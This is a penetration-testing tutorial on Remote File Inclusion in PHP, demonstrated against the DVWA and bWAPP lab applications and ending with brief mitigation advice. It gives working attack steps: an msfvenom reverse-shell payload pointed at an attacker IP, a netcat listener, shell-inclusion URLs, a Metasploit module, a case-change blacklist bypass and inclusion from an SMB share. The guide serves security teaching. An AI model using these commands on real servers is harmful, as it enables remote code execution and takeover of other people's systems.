---
id: ckb-a6d5d8e68136
title: Remote File Inclusion
category: application-security
format: guide
language: en
tags: [linux, metasploit, tls, web-security, windows]
license: NOASSERTION
added: 2026-10-04
classification:
  method: heuristic
  confidence: 0.6
---

Comprehensive Guide on Remote File Inclusion (RFI)

                                                                                                 1 | P a g e

Comprehensive Guide on Remote File Inclusion (RFI)

                                                                                                 2 | P a g e

Contents
Introduction ............................................................................................................................................ 3
Introduction to RFI .................................................................................................................................. 3
Why Remote File Inclusion Occurs .......................................................................................................... 3
Remote File Inclusion Exploitation .......................................................................................................... 4
Basic Remote File Inclusion ................................................................................................................. 4
Reverse Shell through Netcat .............................................................................................................. 5
RFI over Metasploit ............................................................................................................................. 7
Bypass a Blacklist Implemented .......................................................................................................... 8
Null Byte Attack ................................................................................................................................... 9
Exploitation through SMB Server ...................................................................................................... 10
Mitigation Steps .................................................................................................................................... 12

Comprehensive Guide on Remote File Inclusion (RFI)

                                                                                                 3 | P a g e

Introduction
Have you ever wondered about the URL of the web-applications, some of them might include files
from the local or the remote servers as either “page=” or “file=”. I hope you’re aware of the File
Inclusion vulnerability. If not, I suggest you revisit our previous article for better understanding,
before going deeper with the Remote File Inclusion Vulernabilty implemented in this section.
Introduction to RFI
Remote File inclusion is another variant to the File Inclusion vulnerability, which arises when the
URI of a file is located on a different server and is passed to as a parameter to the PHP functions
either “include”, “include_once”, “require”, or “require_once”.
The Remote File Inclusion vulnerabilities are easier to exploit but are less common say in 1 of the 10
web-applications. Here thus, instead of accessing a file on a local server, the attacker could simply
inject his/her vulnerable PHP scripts which are hosted on his remote web-application into the
unsanitized web application's URL, which thus might lead to disastrous results such as:
1. Allowing the attacker to execute remote commands on a web server as [RCE].
2. Provides complete access to the server.
3. Deface parts of the web or even steal confidential information.
4. Implementation of Client-Side attacks as Cross-Site Scripting (XSS).

Therefore, this Remote File Inclusion vulnerability has been reported as “Critical ” and with the CVSS
score of “9.8”  under:
1. CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program.
2. CWE-20: Improper Input Validation
3. CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
Why Remote File Inclusion Occurs
Unlike Local File Inclusion, this remote file inclusion vulnerability also occurs due to the poorly
written PHP server-side codes where the input parameters are not properly sanitized or validated.
Comprehensive Guide on Remote File Inclusion (RFI)

                                                                                                 4 | P a g e

Look at the following code snippet, which thus lets the web-application to suffer from the RFI
vulnerability as the developer is only dependable on the “$file” variable with the “GET” method and
hadn’t placed any input validation over it.

But this logical error didn’t fulfil the requirements to RFI vulnerability until the developer enables
some insecure PHP settings as “allow_url_include = On” and “allow_url_fopen = On”, Therefore the
combination of these two i.e. the developer logic and the insecure settings, open the gates to the
disastrous RFI vulnerability.

Remote File Inclusion Exploitation
Basic Remote File Inclusion
I guess, up till now, you might have a clear vision with what Remote File Inclusion is and why it
occurs. So, let’s try to dig some deeper and deface some web-applications with a goal to achieve a
reverse shell.
I’ve opened the target IP in my browser and logged in inside DVWA as admin: password, further I’ve
opted for the File Inclusion vulnerability present on the left-hand side of the window. And even for
this time, I’ve kept the security level to low.
Note:
allow_url_include is disabled by default. If allow_url_fopen is disabled, allow_url_include is also
disabled
You can enable allow_url_include from php.ini by running the following commands:
Comprehensive Guide on Remote File Inclusion (RFI)

                                                                                                 5 | P a g e

nano /etc/php/7.2/apache2/php.ini
allow_url_include = On
allow_url_include = Off
Therefore, now we’ll be presented with a web-page which is suffering from File Inclusion
vulnerability as it is simply including the include.php file into its URL parameter as
“page=include.php”

Let’s try to manipulate this URL parameter and surf google.com over this DVWA application as:
192.168.0.2/DVWA/vulnerabilities/fi/?page=https://www.google.com

Cool !! The below image thus confirms up that this application is vulnerable to RFI vulnerability.
Reverse Shell through Netcat
Won’t you be happy, if we could convert this basic RFI exploitation to a reverse shell, let’s check it out
how?
Comprehensive Guide on Remote File Inclusion (RFI)

                                                                                                 6 | P a g e

Initially, we’ll generate up a payload using the best php one-liner as:
msfvenom -p php/reverse_php lport=4444 lhost=192.168.0.5 > /root/Desktop/shell.php

Great, let’s now host this directory so that we could use it over in the URL parameter.
python –m SimpleHTTPServer
From the below image, you can see that the Desktop folder has been hosted over the HTTP server
on port 8000.

Now let’s boot up our Netcat listener over on port 4444
nc –lvp 4444
As the netcat is about to listen, till that time, let’s include our shell over in the vulnerable URL
parameter as :
192.168.0.2/DVWA/vulnerabilities/fi/?page=http://192.168.0.5:8000/shell.php

Fire up the forward button and get back our netcat listener, it might have some interesting things for
us.\ Great !! We’ve successfully captured up the reverse shell. Let’s grab up some striking details
now.
Comprehensive Guide on Remote File Inclusion (RFI)

                                                                                                 7 | P a g e

RFI over Metasploit
Wasn’t the Netcat procedure was long and complicated enough, just to get a reverse shell.
So let’s do some smart work & let’s boot one of the favourite tools of every pentester i.e.
“Metasploit”
But before using any exploit into that, let’s capture up the HTTP Header of the URL that confirmed us
the RFI existence i.e. “page=https://www.google.com”  and further copy the logged in PHP session
id along with all the security information.
Here I’ve used the Live HTTP Header - a firefox plugin, in order to capture the same.

So, it’s time to get the full control of the web application's server, just simply execute the following
commands and you are good to in:
msf > use exploit/unix/webapp/php_include
set payload php/meterpreter/bind_tcp
set RHOST 192.168.0.2
set PATH /DVWA/vulnerabilities/fi/
set HEADERS " Cookie: security=low; PHPSESSID=4536da6h54ski6ftv09gdq35ik"
exploit
Wooah !! With some basic executions, we got the meterpreter session.
Comprehensive Guide on Remote File Inclusion (RFI)

                                                                                                 8 | P a g e

Bypass a Blacklist Implemented
So, it's not time we were lucky enough that the developer sets up the code without any validations.
They might set some blacklists with the commonly used elements as “http:” or “https:”. Or even like
them to secure up their web-application.
Therefore, to bypass this implemented blacklist, we need to try all the different combinations like
“HTTP:” or “hTTp:” that the developer might forget to add.
I’ve increased up the security level to “medium” and tried up with all the different combinations.
From the below image you can see that the  “HTTPS” worked for me and would thus be able to
exploit the RFI vulnerability again.
Comprehensive Guide on Remote File Inclusion (RFI)

                                                                                                 9 | P a g e

Null Byte Attack
A developer can never forget, to add up a ‘.php’ extension into their codes at the end of the required
variable before it gets included. That is the webserver will interpret every file with the “.php”
extension.
Thus, if I wish to include “tryme.txt” into the URL parameter, the server would interpret it as
“tryme.txt.php.” and drop back an error message.

So, what should we do when the developer sets this all?
The answer is to go for the Null Byte Attack, using up the question mark [?] character. Which will
thus neutralize the problem of the “.php”, forcing the php server to ignore everything after that, as
soon as it is interpreted.
Comprehensive Guide on Remote File Inclusion (RFI)

                                                                                                 10 | P a g e

192.168.0.3/bWAPP/rlfi.php?language=http://192.168.0.5:8000/tryme.txt?

Exploitation through SMB Server
As discussed earlier, RFI vulnerability is about to impossible until the developer enables up the
“allow_url_include” or “allow_url_fopen” in the php.ini file.
But what if, if the developer never enabled that feature, and run his web application as simple as he
could without including any specific file from any remote server. Would it still be vulnerable to RFI?
The answer is “Yes”, RFI vulnerabilities can be exploited through the SMB Server even if the
“allow_url_include” or “allow_url_fopen” is set to Off.
As when the “allow_url_include” in PHP is set to “off”, it does not load any remote HTTP or FTP URL’s
to prevent remote file inclusion attacks, but this ”allow_url_include” does not prevent loading SMB
URLs.
Wonder how to grab this all? Let’s exploit it out here in this section. So, I’ve set up the vulnerable
bWAPP application over in my windows machine. You can do the same from here.
Let’s Start!!
Initially, I had reconfigured my PHP server by disallowing the “allow_url_include” and
“allow_url_fopen” wrapper in the “php.ini” file at C:\xampp\php\
Comprehensive Guide on Remote File Inclusion (RFI)

                                                                                                 11 | P a g e

Now in order to activate the SMB service in my Kali machine. I’ve used the impacket toolkit which
thus set up everything with a simple one-liner as:
python smbshare.py –smb2support sharepath /root/Desktop/Shells
As we are executing our attack over the windows 10 machine. So here I have used the
“smb2support” and had further set the share directory as /root/Desktop/Shells/ . You can learn
more about Impacket from here.
From the below image you can see that our directory has been shared successfully over the SMB
server without any specific credentials.

In order to confirm up the same, let’s check it all out on any windows machine over the “Run dialog
box” as
\\192.168.0.8\sharepath\

Comprehensive Guide on Remote File Inclusion (RFI)

                                                                                                 12 | P a g e

Cool!! Our SMB Server works perfectly and we’re able to access its shared files.
So, let’s get back to our Kali machine and check whether the PHP code is allowing any remote file
inclusion or not. From the below image, you can see that when I tried with the basic RFI attack. I was
presented with an error message as “https:// wrapper is disabled” by allow_url_include=0. Which
thus confirms that the PHP code is blocking the files to be included from any remote server.

So, it’s time to deface this web-application by bypassing the “allow_url_include” wrapper with our
SMB share link as :
192.168.0.3/bWAPP/rlfi.php?language=\\192.168.0.8\sharepath\shell.txt
Great!! From the image below you can see that our shell has successfully been included into this
vulnerable web-application and we’re presented with the contents of it.

Mitigation Steps
•
To prevent web applications from the file inclusion attacks, we need to use strong
input validation. we should restrict the input parameter to accept a whitelist of acceptable
files and reject all other inputs that do not strictly conform to specifications.
Sanitizing user-supplied / controlled inputs to the best of your ability is always preferable. Those
inputs are: GET/POST parameters
Comprehensive Guide on Remote File Inclusion (RFI)

                                                                                                 13 | P a g e

•
URL parameters
•
Cookie values
•
HTTP header values
This can all be examined with the following code snippet:

•
Develop or run the code in the most recent version of the PHP server which is available.
And even configure the PHP applications so that it does not use register_globals.
•
On the server-side, configure the ini configuration file. By disallowing remote file include of
http URI which limits the ability to include the files from remote locations i.e. by changing
the configuration file with the following command:
nano /etc/php/7.2/apache2/php.ini
"allow_url_fopen = OFF"
"allow_url_include = OFF"
sudo service apache2 restart

To learn more about Website Hacking. Follow this Link.
FOLLOW US ON
FOR MORE DETAILS
CONTACT US
T W I T T E R
G I T H U B
L I N K E D I N
D I S C O R D
JOIN OUR
TRAINING PROGRAMS
www.ignitetechnologies.in
BEGINNER
Network Pentest
Bug Bounty
Wireless Pentest
Network Security
Essentials
Ethical Hacking
ADVANCED
EXPERT
Burp Suite Pro
CTF
Windows
Linux
Pro
Infrastructure VAPT
APT’s - MITRE Attack Tactics
MSSQL Security Assessment
Active Directory Attack
Red Team Operation
Privilege Escalation
Web
Services-API
Android Pentest
Computer
Forensics
Advanced
Metasploit
CLICK HERE
